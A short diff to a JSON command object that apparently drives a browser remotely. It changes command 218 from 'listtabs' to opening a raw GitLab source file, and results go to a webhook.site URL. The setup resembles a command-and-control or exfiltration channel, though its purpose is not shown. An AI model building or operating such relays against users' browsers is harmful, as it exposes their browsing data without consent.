@@ -1,6 +1,9 @@
 {
-  "cmd_seq": 217,
-  "action": "listtabs",
-  "args": {},
+  "cmd_seq": 218,
+  "action": "open",
+  "args": {
+    "url": "https://gitlab.com/gaia-x/lab/wizards/compliance-wizard/-/raw/main/contexts/SignatureContext.tsx",
+    "timeout": 30
+  },
   "resp_url": "https://webhook.site/bc53085a-10ce-41e7-8c4d-120f043c2ad0"
 }
